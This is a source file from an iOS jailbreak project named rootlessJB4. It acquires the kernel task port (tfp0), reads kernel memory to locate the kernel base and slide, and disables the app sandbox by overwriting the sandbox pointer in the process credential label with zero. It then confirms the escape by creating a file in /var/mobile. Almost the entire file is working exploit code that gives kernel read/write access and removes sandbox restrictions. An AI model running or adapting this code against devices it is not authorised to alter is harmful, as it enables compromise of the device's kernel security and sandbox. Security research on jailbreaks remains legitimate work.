//
//  everythingElse.c
//  rootlessJB4
//
//  Created by Brandon Plank on 8/28/19.
//  Copyright © 2019 Brandon Plank. All rights reserved.
//

#import <Foundation/Foundation.h>
#include "everythingElse.h"
#include "sockport.h"
#include "offsets.h"
#include "kernel_memory.h"


#define LOG(string, args...) do {\
printf(string "\n", ##args); \
} while (0)

mach_port_t tfp0;
uint64_t kernel_slide;
uint64_t kernel_base;
uint64_t task_self_addr_cache;
uint64_t selfproc_cached;

uint64_t find_kbase()
{
    uint64_t task_port_addr = task_self_addr_cache;
    uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = mach_host_self() >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
    
    uint64_t realhost = rk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    uint64_t base = realhost & ~0xfffULL;
    // walk down to find the magic:
    for (int i = 0; i < 0x10000; i++) {
        if (rk32(base) == 0xfeedfacf) {
            return base;
        }
        base -= 0x1000;
    }
    return 0;
}

bool runExploit()
{
    
    mach_port_t tmp;
    kern_return_t kRet = host_get_special_port(mach_host_self(), 0, 4, &tmp);
    if (kRet == KERN_SUCCESS && MACH_PORT_VALID(tmp)) {
        tfp0 = tmp;
        rebuild(tmp);
    } else {
        tfp0 = get_tfp0();
        if (!MACH_PORT_VALID(tfp0)) {
            goto err;
        }
    }

    kernel_base = find_kbase();
    kernel_slide = (kernel_base - 0xFFFFFFF007004000);
    
success:
    return true;
err:
    return false;
}


bool escapeSandbox()
{
    // 00 00 00 00 00 | No Sandbox
    // 01 00 00 00 00 | Sandbox
    uint64_t ucred = rk64(selfproc_cached + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    uint64_t cr_label = rk64(ucred + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL));
    uint64_t sandbox_addr = cr_label + 0x8 + 0x8;
    wk64(sandbox_addr, (uint64_t) 0);
    [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/test_jb" contents:NULL attributes:nil];
    if ([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/test_jb"])
    {
        [[NSFileManager defaultManager] removeItemAtPath:@"/var/mobile/test_jb" error:nil];
        return true;
    } else {
        return false;
    }
    
}
